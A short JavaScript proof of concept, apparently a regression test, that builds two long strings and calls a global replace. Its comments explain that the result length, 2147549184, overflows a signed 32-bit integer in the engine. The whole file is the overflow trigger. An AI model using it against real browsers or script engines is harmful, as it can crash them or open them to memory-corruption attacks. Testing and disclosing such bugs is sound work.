/* Length of 32 */
var foo = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

/* Make len(foo) 32768 */
for (i = 0; i < 10; ++i) {
	foo += foo;
}

/* Add one "a" to cause overflow later */
foo += "a";

var bar = "bbbbbbbbbbbbbbbb";

/* Make len(bar) 65536 */
for (i = 0; i < 12; ++i) {
	bar += bar;
}


/* Resulting string should be 
 * len(foo)*len(bar) = (2^10 * 32 + 1) * 65536 = 2147549184 
 * which will be negative as jsint
 */
foo.replace(/[a]/g, bar);
